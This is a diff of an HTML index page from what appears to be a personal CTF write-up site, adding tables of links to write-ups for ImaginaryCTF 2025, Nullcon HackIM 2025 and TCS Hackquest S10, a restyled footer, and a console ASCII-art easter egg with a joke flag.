+                                <a href="/writeups/imaginaryctf-2025-fore-obsuct/">ImaginaryCTF Forensic - obsuct</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/04/27</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194306</td>
+                            <td class="ida-name">
+                                <a href="/writeups/imaginaryctf-2025-fore-wave/">ImaginaryCTF Forensics - wave</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/04/27</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194307</td>
+                            <td class="ida-name">
+                                <a href="/writeups/imaginaryctf-2025-rev-weird-app/">rev-weird-app</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/04/27</td>
+                        </tr>
+                        
+                    </tbody>
+                </table>
+            </div>
+        
+            <h2 style="font-family: var(--font-mono); font-size: 1.1rem; color: var(--syn-address); margin-top: 2rem; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                Nullcon HackIM 2025 <span style="font-size: 0.85rem; color: var(--text-muted); float: right;">[1 items]</span>
+            </h2>
+            
+            <div class="ida-list-wrapper">
+                <table class="ida-list">
+                    <thead>
+                        <tr>
+                            <th>Address</th>
+                            <th>Function Name</th>
+                            <th>Segment</th>
+                            <th>Date</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194305</td>
+                            <td class="ida-name">
+                                <a href="/writeups/nullcon-berlin-hackim-2025-ctf-misc-usbstorage/">Nullcon Berlin HackIM 2025 CTF – Misc: USB Storage</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/04/27</td>
+                        </tr>
+                        
+                    </tbody>
+                </table>
+            </div>
+        
+            <h2 style="font-family: var(--font-mono); font-size: 1.1rem; color: var(--syn-address); margin-top: 2rem; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                TCS Hackquest S10 Round 1 <span style="font-size: 0.85rem; color: var(--text-muted); float: right;">[9 items]</span>
+            </h2>
+            
+            <div class="ida-list-wrapper">
+                <table class="ida-list">
+                    <thead>
+                        <tr>
+                            <th>Address</th>
+                            <th>Function Name</th>
+                            <th>Segment</th>
+                            <th>Date</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194305</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-address-abyss/">Address Abyss</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194306</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-catch-me-if-you-bot/">Catch Me If You Bot</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194307</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-hidden-layers/">Hidden Layers</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194308</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-know-me-better/">Know Meh Better</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194309</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-noise/">Noise</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194310</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-paper-scripts/">Paper Scripts</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194311</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-seeds-of-time/">Seeds of Time</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194312</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-stackfall/">StackFall</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194313</td>
+                            <td class="ida-name">
+                                <a href="/writeups/tcs-hackquest-s10-r1-synthetic-stacks/">Synthetic Stacks</a>
+                                
+                            </td>
+                            <td class="ida-seg">.ctf</td>
+                            <td class="ida-date">2026/05/16</td>
+                        </tr>
+                        
+                    </tbody>
+                </table>
+            </div>
+        
+    </div>
+</div>
+
+    </div>
 
     <footer>
-        <div class="container">
-            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
-                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
-                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
-                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
-                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
-                <a href="mailto:himanshuparate601@gmail.com">Email</a>
-                <span style="color: var(--text-muted);">Discord: himasnhu</span>
-            </div>
-            
-            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
-                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
-                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
-                </a>
-            </div>
-
-            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        <div class="page-container">
+            <p>
+                <a href="https://github.com/HimanshuP601" target="_blank">0xGITHUB</a> | 
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">0xLINKEDIN</a> | 
+                <a href="https://medium.com/@HimanshuP601" target="_blank">0xMEDIUM</a> | 
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">0xPWN.COLLEGE</a> | 
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">0xHTB</a>
+            </p>
+            <p style="margin-top: 1rem; color: var(--border-color);">&copy; 2026 Himanshu Parate</p>
         </div>
     </footer>
-    <script src="/assets/js/main.js"></script>
+
+    <script>
+        console.log("%c" +
+            "  .o oOOOOOOOo                                            OOOo\n" +
+            "  Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO\n" +
+            "  OboO''''''''''''.OOo. .oOOOOOo.    OOOo.oOOOOOo..''''''''''OO\n" +
+            "  OOP.oOOOOOOOOOOO \"POOOOOOOOOOOo.   `\"OOOOOOOOOP,OOOOOOOOOOOB'\n" +
+            "  `O'OOOO'     `OOOOo\"OOOOOOOOOOO` .adOOOOOOOOO\"oOOO'    `OOOOo\n" +
+            "  .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO\n" +
+            "  OOOOO                 '\"OOOOOOOOOOOOOOOO\"`                oOO\n" +
+            " oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.\n" +
+            " oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO\n" +
+            " OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO\"`  '\"OOOOOOOOOOOOO.OOOOOOOOOOOOOO\n" +
+            " \"OOOO\"       \"YOoOOOOMOIONODOO\"`  .   '\"OOROAOPOEOOOoOY\"     \"OOO\"\n" +
+            "    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`\n" +
+            "    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .\n" +
+            "    .            oOOP\"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO\"OOo\n" +
+            "                 '%o  OOOO\"%OOOO%\"%OOOOO\"OOOOOO\"OOO':\n" +
+            "                      `$\"  `OOOO' `O\"Y ' `OOOO'  o             .\n" +
+            "    .                  .     OP\"          : o     . \n" +
+            "HTB{w3lc0m3_t0_my_m3m0ry}",
+            "color: red; font-family: monospace; font-size: 14px; font-weight: bold;"
+        );
+    </script>
+    <script type="module">
+        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+        mermaid.initialize({ startOnLoad: true, theme: 'dark' });
+    </script>
 </body>
 </html>
